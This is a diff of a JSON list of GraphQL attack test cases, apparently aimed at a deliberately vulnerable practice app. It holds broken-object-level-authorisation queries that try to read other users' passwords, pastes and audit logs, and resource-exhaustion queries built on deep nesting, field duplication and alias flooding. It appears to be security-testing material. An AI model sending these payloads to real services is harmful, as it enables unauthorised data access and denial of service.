@@ -2,91 +2,91 @@
   {
     "id": "bola_001",
     "attack_class": "BOLA",
-    "target_type": "User",
-    "target_field": "email",
-    "query": "{ user(id: 2) { email } }",
-    "rationale": "Attempts horizontal privilege escalation via direct object reference",
-    "expected_indicator": "200 with unauthorised data OR 403"
+    "target_type": "UserObject",
+    "target_field": "password",
+    "query": "{ me(token: \"invalid_token\") { username password } }",
+    "rationale": "Attempts to access another user's record via the me entry point with an invalid token",
+    "expected_indicator": "200 with another user's data"
   },
   {
     "id": "bola_002",
     "attack_class": "BOLA",
     "target_type": "PasteObject",
     "target_field": "content",
-    "query": "{ paste(id: 3) { content } }",
-    "rationale": "Attempts to access sensitive paste contents via direct object reference",
-    "expected_indicator": "200 with unauthorised data OR 403"
+    "query": "{ readAndBurn(id: 3) { id title content } }",
+    "rationale": "Attempts to access a paste belonging to another user via the readAndBurn entry point",
+    "expected_indicator": "200 with another user's data"
   },
   {
     "id": "bola_003",
     "attack_class": "BOLA",
-    "target_type": "OwnerObject",
-    "target_field": "name",
-    "query": "{ owner(id: 999) { name } }",
-    "rationale": "Attempts to access sensitive owner information via direct object reference",
-    "expected_indicator": "200 with unauthorised data OR 403"
+    "target_type": "AuditObject",
+    "target_field": "gqlquery",
+    "query": "{ audits { id gqlquery } }",
+    "rationale": "Attempts to access audit logs belonging to another user via the audits entry point",
+    "expected_indicator": "200 with another user's data"
   },
   {
     "id": "bola_004",
     "attack_class": "BOLA",
-    "target_type": "AuditObject",
-    "target_field": "gqlquery",
-    "query": "{ audit(id: 2) { gqlquery } }",
-    "rationale": "Attempts to access sensitive audit logs via direct object reference",
-    "expected_indicator": "200 with unauthorised data OR 403"
+    "target_type": "PasteObject",
+    "target_field": "public",
+    "query": "{ paste(id: 999) { id title public } }",
+    "rationale": "Attempts to access a non-existent or unauthorized paste via the paste entry point",
+    "expected_indicator": "404 or 403"
   },
   {
     "id": "bola_005",
     "attack_class": "BOLA",
     "target_type": "UserObject",
-    "target_field": "password",
-    "query": "{ user(id: 3) { password } }",
-    "rationale": "Attempts to access sensitive user credentials via direct object reference",
-    "expected_indicator": "200 with unauthorised data OR 403"
+    "target_field": "username",
+    "query": "{ users(id: 3) { id username } }",
+    "rationale": "Attempts to access another user's record via the users entry point",
+    "expected_indicator": "200 with another user's data"
   },
   {
     "id": 1,
-    "attack_class": "NestedQueryDepthAbuse",
+    "attack_class": "Nested Query Depth Abuse",
     "target_type": "PasteObject",
-    "target_field": "content",
-    "query": "{ paste { content } }",
-    "rationale": "Excessive nesting of queries to consume server resources",
-    "expected_indicator": "Increased CPU usage"
+    "target_field": "owner",
+    "query": "paste(id: 123) { owner { paste { id } } }",
+    "rationale": "Follow real relationships between PasteObject and OwnerObject to nest deeply.",
+    "expected_indicator": "High CPU usage"
   },
   {
     "id": 2,
-    "attack_class": "FieldDuplication",
-    "target_type": "UserObject",
-    "target_field": "username",
-    "query": "{ user { username username } }",
-    "rationale": "Repeatedly querying the same field to consume server resources",
-    "expected_indicator": "Increased memory usage"
+    "attack_class": "Field Duplication",
+    "target_type": "PasteObject",
+    "target_field": "content",
+    "query": "paste(id: 123) { content, content, content, content }",
+    "rationale": "Repeat a real field many times in one query.",
+    "expected_indicator": "High memory usage"
   },
   {
     "id": 3,
-    "attack_class": "BatchedQueryFlood",
-    "target_type": null,
+    "attack_class": "Aliased Query Flooding",
+    "target_type": "Query",
     "target_field": null,
-    "query": "[{ query: { paste { id } } }, { query: { paste { id } } }, ...]",
-    "rationale": "Sending a large number of queries in rapid succession to overwhelm server resources",
-    "expected_indicator": "Increased network traffic and CPU usage"
+    "query": "a1: paste(id: 123), a2: paste(id: 456), a3: paste(id: 789)",
+    "rationale": "Request the same real entry point many times using GraphQL aliases.",
+    "expected_indicator": "High network traffic"
   },
   {
     "id": 4,
-    "attack_class": "NestedQueryDepthAbuse",
-    "target_type": "OwnerObject",
+    "attack_class": "Nested Query Depth Abuse",
+    "target_type": "UserObject",
     "target_field": "pastes",
-    "query": "{ owner { name } }",
-    "rationale": "Excessive nesting of queries to consume server resources",
-    "expected_indicator": "Increased CPU usage"
+    "query": "me(token: \"abc\") { user { pastes { id } } }",
+    "rationale": "Follow real relationships between UserObject and PasteObject to nest deeply.",
+    "expected_indicator": "High CPU usage"
   },
   {
     "id": 5,
-    "attack_class": "BatchedQueryFlood",
-    "target_type": null,
-    "target_field": null,
-    "query": "[{ query: { systemUpdate } }, { query: { systemDiagnostics } }, ...]",
-    "rationale": "Sending a large number of queries in rapid succession to overwhelm server resources",
-    "expected_indicator": "Increased network traffic and CPU usage"
+    "attack_class": "Field Duplication",
+    "target_type": "AuditObject",
+    "target_field": "gqloperation",
+    "query": "audits { gqloperation, gqloperation, gqloperation }",
+    "rationale": "Repeat a real field many times in one query.",
+    "expected_indicator": "High memory usage"
   }
 ]
